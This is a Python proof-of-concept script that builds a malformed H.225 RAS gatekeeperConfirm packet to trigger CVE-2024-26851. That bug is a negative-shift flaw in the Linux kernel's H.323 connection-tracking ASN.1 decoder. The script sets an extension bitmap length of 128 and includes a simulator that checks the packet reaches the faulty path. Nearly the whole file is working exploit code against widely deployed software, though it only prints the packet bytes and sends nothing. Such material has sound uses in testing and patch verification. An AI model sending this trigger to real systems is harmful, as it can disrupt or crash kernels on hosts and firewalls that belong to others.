#!/usr/bin/env python3
"""Craft the CVE-2024-26851 trigger: an H.225 RAS gatekeeperConfirm whose
extension-block bitmap length is 128 (>32) -> get_bitmap() negative shift.

Layout mirrors the kernel's nf_conntrack_h323_asn1.c decoders exactly:
  RasMessage CHOICE {sz=5, lb=24, EXT}:    [ext=0][index=1 (gatekeeperConfirm)]
  GatekeeperConfirm SEQ {sz=2, lb=5, EXT}:[ext=1][bitmap=00]
    requestSeqNum INT WORD                 (align, 2 bytes)
    protocolIdentifier OID BYTE            (align, len byte + len bytes)
    nonStandardData OPT                    absent
    gatekeeperIdentifier OPT               absent
    rasAddress CHOICE {sz=3, lb=7, EXT}:  [ext=0][index=0 (ipAddress)]
      ip OCTSTR FIXD 4                    (align, 4 bytes)
      port INT WORD                       (align, 2 bytes)
    [ext block] 7-bit bitmap len = 127 -> bmp2_len = 128  <-- the bug
    padding so get_bitmap(128) reads stay in bounds
"""

class BW:
    def __init__(self):
        self.bits = []
    def bit(self, b):
        self.bits.append(1 if b else 0)
    def bits_msb(self, value, n):
        for i in range(n - 1, -1, -1):
            self.bits.append((value >> i) & 1)
    def align(self):
        while len(self.bits) % 8:
            self.bits.append(0)
    def bytes_(self, bs):
        self.align()
        for b in bs:
            self.bits_msb(b, 8)
    def pack(self, tail_pad=24):
        self.align()
        by = bytearray()
        for i in range(0, len(self.bits), 8):
            v = 0
            for b in self.bits[i:i + 8]:
                v = (v << 1) | b
            by.append(v)
        by += b"\x00" * tail_pad
        return bytes(by)


def build(ext=1, ext_len_bits=127):
    w = BW()
    # RasMessage
    w.bit(0)                # choice ext flag: root
    w.bits_msb(1, 5)        # index 1 = gatekeeperConfirm
    # GatekeeperConfirm SEQ
    w.bit(ext)              # SEQ ext flag (1 = has extension block)
    w.bits_msb(0, 2)        # fields bitmap: both optionals absent
    # requestSeqNum INT WORD
    w.bytes_(bytes([0x00, 0x01]))
    # protocolIdentifier OID BYTE
    w.bytes_(bytes([0x06]) + b"\x00" * 6)
    # rasAddress CHOICE
    w.bit(0)                # ext flag: root
    w.bits_msb(0, 3)        # index 0 = ipAddress
    # ip (4 bytes) + port (2 bytes), both aligned by the decoder
    w.bytes_(bytes([0x7f, 0x00, 0x00, 0x01]) + bytes([0x1f, 0x90]))
    if ext:
        w.bits_msb(ext_len_bits, 7)   # ext bitmap length: 127 -> +1 = 128
    return w.pack()


def simulate(buf):
    """Mirror the kernel decode walk; return (cur, bit, bmp2_len)."""
    cur, bit = 0, 0
    def gb(n):
        nonlocal cur, bit
        v = 0
        for _ in range(n):
            v = (v << 1) | ((buf[cur] >> (7 - bit)) & 1)
            bit += 1
            if bit > 7:
                cur += 1
                bit = 0
        return v
    def align():
        nonlocal cur, bit
        if bit:
            cur += 1
            bit = 0
    assert gb(1) == 0          # RasMessage ext flag
    assert gb(5) == 1           # index 1 = gatekeeperConfirm
    ext = gb(1)
    assert ext in (0, 1)       # SEQ ext flag
    assert gb(2) == 0           # fields bitmap: optionals absent
    align(); cur += 2           # requestSeqNum INT WORD
    align(); ln = buf[cur]; cur += 1 + ln   # protocolIdentifier OID
    assert gb(1) == 0           # rasAddress ext flag
    assert gb(3) == 0           # index 0 = ipAddress
    align(); cur += 4           # ip OCTSTR FIXD 4
    align(); cur += 2           # port INT WORD
    if ext:
        ln7 = gb(7) + 1
        assert ln7 == 128, ln7  # the bug: get_bitmap(bs, 128)
        remaining_bits = (len(buf) - cur) * 8 - bit
        assert remaining_bits >= 128, remaining_bits  # error_boundary passes
        return cur, bit, ln7
    return cur, bit, 0


if __name__ == "__main__":
    trig = build(ext=1, ext_len_bits=127)
    ctrl = build(ext=0)
    print("trigger packet:", len(trig), "bytes:", trig.hex())
    print("control packet:", len(ctrl), "bytes:", ctrl.hex())
    print("simulate trigger:", simulate(trig))
    print("simulate control: ", simulate(ctrl))
